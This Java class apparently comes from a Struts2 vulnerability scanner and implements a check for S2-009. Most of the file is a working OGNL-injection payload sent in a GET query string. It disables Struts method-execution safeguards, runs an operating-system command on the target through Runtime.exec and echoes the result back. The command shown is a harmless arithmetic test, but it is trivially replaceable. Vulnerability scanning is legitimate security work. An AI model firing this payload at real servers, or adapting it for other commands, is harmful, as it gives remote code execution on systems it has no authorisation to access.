package struts2scan.payload;

import struts2scan.util.HttpClient;
import struts2scan.util.HttpResult;

import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class S2_009 implements Check {

    public String printInfo(){
        String info = "[+] S2-009:影响版本Struts 2.0.0-2.3.1.1; GET请求发送数据";
        return info+"\n";
    }



    @Override
    public boolean check(URL url) throws Exception {
        return false;
    }

    @Override
    public boolean check(String protocol, String host, int port,String path) throws Exception{
        int number1 = new Random(10000).nextInt(10000);
        int number2 = new Random(10000).nextInt(10000);
        String poc = "?debug=command&expression=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%22expr%20"+number1+"%20%2B%20"+number2+"%22).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]";
        int numsum = number1+number2;

        if(path==null){
            path = "/index.action";
        }else if(!path.endsWith(".action")){
            path = path+"index.action";
        }
        String url = protocol+"://"+host+":"+port+path+poc;

        try {
            HttpResult result= HttpClient.get(url);;
            Pattern p = Pattern.compile(String.valueOf(numsum));
            Matcher m =p.matcher(result.getData());
            if(m.find()){
                return true;
            }else{
                return false;
            }
        }catch (Exception e){
            return false;
        }



        }
}

